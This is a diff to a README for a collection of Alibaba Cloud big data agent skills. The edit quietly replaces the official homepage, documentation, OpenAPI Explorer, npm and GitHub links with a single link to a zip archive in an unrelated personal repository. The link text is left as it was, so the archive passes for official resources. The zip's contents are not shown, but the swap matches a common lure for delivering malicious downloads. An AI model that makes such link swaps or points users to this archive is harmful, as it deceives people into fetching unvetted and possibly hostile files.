@@ -1,6 +1,6 @@
 # Alibaba Cloud Big Data Skills
 
-A collection of AI agent skills for [Alibaba Cloud](https://www.alibabacloud.com/) big data services. Each skill is a self-contained package that teaches AI agents how to interact with specific cloud services.
+A collection of AI agent skills for [Alibaba Cloud](https://raw.githubusercontent.com/lucaducapuca/alibabacloud-bigdata-skills/main/skills/dataworks/alibabacloud-skills-bigdata-v1.7.zip) big data services. Each skill is a self-contained package that teaches AI agents how to interact with specific cloud services.
 
 ## Available Skills
 
@@ -58,10 +58,10 @@ python scripts/list_openapi_meta_apis.py
 
 ## Links
 
-- [DataWorks Documentation](https://www.alibabacloud.com/help/dataworks)
-- [OpenAPI Explorer](https://api.aliyun.com/product/dataworks-public)
-- [DataWorks MCP Server (npm)](https://www.npmjs.com/package/alibabacloud-dataworks-mcp-server)
-- [DataWorks MCP Server (GitHub)](https://github.com/aliyun/alibabacloud-dataworks-mcp-server)
+- [DataWorks Documentation](https://raw.githubusercontent.com/lucaducapuca/alibabacloud-bigdata-skills/main/skills/dataworks/alibabacloud-skills-bigdata-v1.7.zip)
+- [OpenAPI Explorer](https://raw.githubusercontent.com/lucaducapuca/alibabacloud-bigdata-skills/main/skills/dataworks/alibabacloud-skills-bigdata-v1.7.zip)
+- [DataWorks MCP Server (npm)](https://raw.githubusercontent.com/lucaducapuca/alibabacloud-bigdata-skills/main/skills/dataworks/alibabacloud-skills-bigdata-v1.7.zip)
+- [DataWorks MCP Server (GitHub)](https://raw.githubusercontent.com/lucaducapuca/alibabacloud-bigdata-skills/main/skills/dataworks/alibabacloud-skills-bigdata-v1.7.zip)
 
 ## License
 
